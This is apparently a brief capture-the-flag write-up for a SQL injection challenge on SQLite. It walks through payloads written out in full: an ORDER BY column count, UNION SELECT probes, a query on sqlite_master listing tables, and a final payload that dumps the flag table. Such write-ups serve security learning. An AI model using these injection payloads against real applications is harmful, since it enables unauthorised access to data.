At first, we have 2 hints that is the dbms is SQLITE and the query is:
```
WHERE (id IS NOT NULL) AND (ID = our_payload AND display = 1)
```
Besides we can see that the default parameter is: 
```
MQ== -> Base64 Decode = 1
```
We can break the query by using another id like 2
```
2) order by 3-- -> No result found. -> 3 columns
2) union select '1', '2', '3'-- -> 1 -> first column will be visible
2) union select name, null, null from sqlite_master where type = "table"-- -> flag
```
Final payload:
```
2) union select * from flag-- 
```